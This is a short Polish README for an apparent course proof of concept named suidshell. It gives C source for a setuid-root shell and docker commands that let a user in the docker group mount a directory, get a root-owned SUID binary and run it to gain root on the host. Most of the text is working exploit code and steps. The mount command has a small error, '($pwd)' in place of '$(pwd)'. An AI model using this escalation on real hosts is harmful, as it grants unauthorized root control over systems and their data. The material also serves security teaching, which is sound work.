# suidshell

Kompiluje prosty *suid shell*:

```
#include <unistd.h>
void main() { 
    setuid(0); seteuid(0); setgid(0); setegid(0); 
    execl("/bin/bash", "bash", NULL);
}
```
do */tmp/suidshell* i ustawia mu bit SUID (`chmod +s /tmp/suidshell`).

Jeśli masz uprawnienia do uruchamiania nowych kontenerów, ale nie masz uprawnień roota (np. należysz do grupy *docker*), z tym proof-of-concept możesz szybko roota mieć:

```
mkdir tmp
docker run -v ($pwd):/tmp aptmasterclass/suidshell
./tmp/suidshell
id
```

Ilustracja do https://aptmasterclass.com/ oraz https://blog.aptmasterclass.com/.
